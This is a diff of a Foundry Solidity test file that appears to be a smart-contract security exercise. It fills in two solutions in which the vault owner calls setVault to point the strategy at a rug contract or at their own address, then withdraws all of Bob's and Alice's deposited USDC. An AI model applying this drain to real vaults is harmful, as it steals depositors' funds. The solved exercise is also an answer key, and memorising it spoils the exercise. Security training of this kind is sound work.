@@ -16,7 +16,7 @@ contract TestOV2 is Test {
     address owner = makeAddr("owner");
     address bob = makeAddr("bob");
     address alice = makeAddr("alice");
-    
+
     DummyERC20 usdc; // Fake USDC, 18 decimals
     YieldContract yieldContract;
     OptimizerStrategy strategy;
@@ -54,36 +54,50 @@ contract TestOV2 is Test {
     }
 
     function testVaultRugPull() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
 
         // TODO: Owner deploys rugging contract
-
+        vm.startPrank(owner);
+        RugContract rugContract = new RugContract(address(strategy));
         // TODO: Owner rugs the vault system
+        strategy.setVault(address(rugContract));
+        rugContract.rug();
 
-        /** SUCCESS CONDITIONS */
-
+        /**
+         * SUCCESS CONDITIONS
+         */
         uint256 ruggedAmount = BOB_USDC_BALANCE + ALICE_USDC_BALANCE;
-		uint256 withdrawalFees = ruggedAmount / 100;
+        uint256 withdrawalFees = ruggedAmount / 100;
 
-		// The strategy is now empty except for withdrawal fees
+        // The strategy is now empty except for withdrawal fees
         assertEq(strategy.balanceOf(), withdrawalFees);
 
-		// The owner now holds the rugged USDC minus withdrawalFees
+        // The owner now holds the rugged USDC minus withdrawalFees
         assertEq(usdc.balanceOf(owner), ruggedAmount - withdrawalFees);
     }
 
     function testVaultRugPullWithoutContract() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(owner);
+        uint256 vaultBal = strategy.balanceOf();
 
-        /** SUCCESS CONDITIONS */
+        strategy.setVault(owner);
+        strategy.withdraw(vaultBal);
 
+        /**
+         * SUCCESS CONDITIONS
+         */
         uint256 ruggedAmount = BOB_USDC_BALANCE + ALICE_USDC_BALANCE;
-		uint256 withdrawalFees = ruggedAmount / 100;
+        uint256 withdrawalFees = ruggedAmount / 100;
 
-		// The strategy is now empty except for withdrawal fees
+        // The strategy is now empty except for withdrawal fees
         assertEq(strategy.balanceOf(), withdrawalFees);
 
-		// The owner now holds the rugged USDC minus withdrawalFees
+        // The owner now holds the rugged USDC minus withdrawalFees
         assertEq(usdc.balanceOf(owner), ruggedAmount - withdrawalFees);
     }
 }
